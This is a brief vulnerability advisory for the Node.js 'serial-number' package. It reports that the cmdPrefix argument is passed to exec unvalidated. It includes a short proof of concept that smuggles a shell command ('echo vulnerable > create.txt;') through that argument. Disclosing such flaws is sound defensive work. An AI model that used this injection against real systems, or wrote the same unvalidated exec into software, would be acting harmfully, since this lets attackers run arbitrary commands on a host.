# Overview

`serial-number` is a simple Node.js module for accessing the serial number (a.k.a. Dell Service Tag, asset tag) of the local machine, this package are vulnerable to Command Injection.

The `cmdPrefix` argument in `serialNumber` function is used by the `exec` function without any validation.

# Proof of Concept

```
var root = require("serial-number");
root(function(){},"echo vulnerable > create.txt;");
```
